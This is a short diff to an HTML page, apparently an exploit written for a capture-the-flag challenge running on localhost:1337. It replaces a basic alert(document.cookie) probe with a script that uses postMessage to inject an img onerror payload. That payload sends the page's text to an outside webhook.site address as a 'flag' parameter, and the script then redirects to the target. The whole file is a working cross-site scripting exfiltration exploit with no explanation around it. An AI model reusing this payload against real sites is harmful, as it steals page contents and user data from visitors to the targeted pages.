@@ -1,9 +1,16 @@
 <!DOCTYPE html>
+<html>
 <head></head>
 <body>
-  <p>
-    sium
-    <script>alert(document.cookie)</script>
-  </p>
+    <script>
+        const payload = `<img src=x onerror="fetch('https://webhook.site/510a53ec-3c80-4a96-b7f6-fd9e25f31549?flag=' + encodeURIComponent(document.body.innerText))">`;
+        window.postMessage({
+            type: "SET",
+            replacementString: payload
+        }, '*');
+        setTimeout(() => {
+            window.location.href = 'http://localhost:1337';
+        }, 500);
+    </script>
 </body>
 </html>
